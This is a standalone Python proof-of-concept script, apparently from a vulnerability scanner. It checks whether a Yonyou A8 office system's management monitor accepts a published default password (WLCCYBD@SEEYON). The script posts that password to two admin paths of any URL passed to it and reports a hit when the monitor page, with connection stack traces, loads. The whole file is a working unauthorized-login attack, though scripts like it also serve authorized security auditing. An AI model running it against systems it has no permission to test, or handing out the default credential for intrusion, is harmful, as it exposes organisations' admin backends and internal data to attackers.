#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友a8监控后台默认密码漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0157458
author: Lucifer
description: 路径seeyon/management/status.jsp存在默认密码WLCCYBD@SEEYON。
'''
import sys
import json
import requests
import warnings
sys.path.append('../../')
from color import *

class yonyou_status_default_pwd:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {"password":"WLCCYBD@SEEYON"}
        payloads = {"/seeyon/management/index.jsp",
                    "/management/index.jsp"}
        try:
            noexist = True
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
                if r"A8 Management Monitor" in req.text and r"Connections Stack Trace" in req.text:
                    printGreen("[+]Success:存在用友a8监控后台默认密码漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
                    noexist = False
            if noexist:
                printBlue("[-]Info:不存在yonyou_status_default_pwd漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yonyou_status_default_pwd(sys.argv[1])
    testVuln.run()